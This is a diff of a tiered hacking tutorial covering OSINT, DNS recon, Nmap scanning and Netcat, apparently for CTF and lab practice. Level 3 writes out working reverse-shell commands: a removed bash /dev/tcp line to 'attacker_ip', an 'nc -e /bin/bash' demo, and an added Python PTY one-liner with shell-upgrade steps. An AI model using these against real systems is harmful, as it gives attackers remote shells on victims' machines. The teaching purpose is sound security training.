@@ -5,76 +5,77 @@
 
 **Key Terminology:**
 *   **IP Address:** The logical address of a machine (`192.168.1.1`).
-*   **Port:** An address for a specific service (`80` for Web, `22` for SSH).
 *   **Protocol:** The rules of communication (TCP, UDP, ICMP).
-*   **WHOIS:** A database of domain owners.
+*   **WHOIS:** A database of domain owners and registration details.
+*   **DNS (Domain Name System):** The "Phonebook" of the internet, mapping names (`google.com`) to IPs.
 
 ---
 
 ## Level 1: Fundamentals
-**Goal:** Gather information without touching the target server.
+**Goal:** Gather information without triggering alerts on the target.
 
-### 1.1 Passive Recon (OSINT)
-Using public information.
-*   **Google Dorking:** Advanced searches.
-    *   `site:target.com filetype:pdf` -> Finds leaked PDF documents.
-*   **Wayback Machine:** Viewing deleted pages of a website.
+### 1.1 Passive Recon & OSINT
+*   **Google Dorking:** Use `intitle:"index of" "parent directory"` to find exposed file listings.
+*   **Shodan:** The search engine for IoT devices. Find exposed webcams, routers, and industrial controllers.
 
-### 1.2 `ping` and `whois`
-*   `ping google.com`: "Are you alive?" Checks connectivity (ICMP).
-*   `whois google.com`: "Who owns you?" Checks registration info.
+### 1.2 DNS Investigation
+*   **Dig & NSLookup:**
+    *   `dig target.com A`: Find the IPv4 address.
+    *   `dig target.com MX`: Find the mail servers (useful for phishing/social engineering recon).
+    *   `nslookup -type=txt target.com`: Often contains verification codes or hidden flags in CTFs.
 
-### Practice 1.1: The Digital Detective
-**Scenario:** You investigate `megacorp.com`.
-1.  Run `whois megacorp.com`.
-2.  Find the "Registrant Name" or "Admin Email".
-3.  Google that email to find social media profiles.
+### Practice 1.1: The DNS Detective
+**Scenario:** Investigate `megacorp.com`.
+1.  Run `nslookup -type=any megacorp.com`.
+2.  Find the `TXT` records.
+3.  Look for a flag like `CTF{DNS_RECORDS_ARE_PUBLIC}`.
 
-**Challenge Question 1:** What does `tracert` (Windows) or `traceroute` (Linux) do? (It maps every hop/router between you and the target).
+**Challenge Question 1:** What does the `ttl` (Time to Live) value in a DNS record represent?
 
 ---
 
 ## Level 2: Intermediate
-**Goal:** Map the target's attack surface with Nmap.
+**Goal:** Map the network and detect services using Nmap.
 
-### 2.1 Nmap (Network Mapper)
-The gold standard scanner.
-*   **Scan Types:**
-    *   `-sS` (SYN Scan): Stealthy (Step 1 & 2 of handshake).
-    *   `-sV` (Version): "Which Apache version is running?"
-    *   `-p-` (All ports): Scan 1-65535.
+### 2.1 The Nmap Flag Table
+| Flag | Name | Function |
+|---|---|---|
+| `-sS` | SYN Scan | Half-open scan. Fast and stealthy. |
+| `-sV` | Version | Probes open ports to determine service versions. |
+| `-sC` | Script | Runs default Nmap scripts (vulnerability detection). |
+| `-p-` | All Ports | Scans every possible port (1-65535). |
+| `-A` | Aggressive | Combines OS detection, versioning, and scripting. |
 
-### Practice 2.1: The Cartographer
-**Scenario:** Target IP `10.10.10.5`.
-1.  Run `nmap -sV -sC 10.10.10.5`.
-2.  Output:
-    *   `Port 22`: OpenSSH 7.2.
-    *   `Port 80`: Apache 2.4.18.
-3.  Analysis: Search `Exploit-DB` for "Apache 2.4.18 vulnerabilities".
+### Practice 2.1: Profiling the Target
+**Scenario:** IP `10.10.10.5`.
+1.  Run `nmap -T4 -A 10.10.10.5`.
+2.  Analysis: If port `445` is open with `samba`, search for "EternalBlue" exploit.
 
-**Challenge Question 2:** Why might a firewall block a "Ping" (`ICMP`) but allow a Web request (`TCP 80`)? (Security policy often blocks ICMP to hide presence, but Web must be open for business).
+**Challenge Question 2:** Why is a "Stealth SYN Scan" (`-sS`) considered stealthy compared to a full TCP Connect scan (`-sT`)?
 
 ---
 
 ## Level 3: Advanced
-**Goal:** Establish Command & Control (C2) with Netcat.
+**Goal:** Establish Command & Control and transfer files with Netcat.
 
-### 3.1 Netcat (`nc`)
-The "Swiss Army Knife". It reads and writes TCP/UDP connections.
-*   **Connect:** `nc [IP] [PORT]` -> Acts like a browser/client.
-*   **Listen:** `nc -lvnp [PORT]` -> Acts like a server.
+### 3.1 Netcat File Transfers
+Netcat isn't just for shells; it's a fast way to move data.
+*   **Receiver:** `nc -l -p 1234 > received_file.zip`
+*   **Sender:** `nc [IP] 1234 < file_to_send.zip`
 
-### 3.2 The Reverse Shell
-The "Holy Grail" of hacking.
-1.  **Attacker:** Starts a listener. `nc -lvnp 4444`.
-2.  **Victim:** Runs a command that connects BACK to the attacker and gives them a shell (`/bin/sh`).
-    *   Command: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
-3.  **Result:** Attacker sees a command prompt of the victim machine.
+### 3.2 The Reverse Shell (Industrial Strength)
+*   **Python One-Liner:**
+    ```python
+    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+    ```
+*   **Why use this?** It spawns a fully interactive PTY (pseudo-terminal), allowing things like `sudo` and `vim` to work inside the shell.
 
-### Practice 3.1: Catching a Shell
-**Task:** Simulate a reverse shell locally.
-1.  Terminal 1 (Attacker): `nc -lvnp 9001`
-2.  Terminal 2 (Victim): `nc 127.0.0.1 9001 -e /bin/bash`
-3.  Go back to Terminal 1. Type `ls`. You should see the files!
+### Practice 3.1: Upgrading your Shell
+**Task:** Turn a basic Netcat shell into a "pro" shell.
+1.  Attacker: `nc -lvnp 4444`.
+2.  Victim: Connects back with the Python one-liner above.
+3.  Attacker: Inside the shell, run `CTRL+Z` -> `stty raw -echo; fg` -> `reset`.
+4.  **Result:** You now have TAB-completion and a clearable screen!
 
-**Challenge Question 3:** What is a "Bind Shell"? (The opposite of Reverse Shell; the victim opens a port and listens, attacker connects to them. Less common due to firewalls blocking incoming ports).
+**Challenge Question 3:** What is a "Static Binary" and why do hackers use static versions of tools like `nmap` or `socat` during post-exploitation?
+
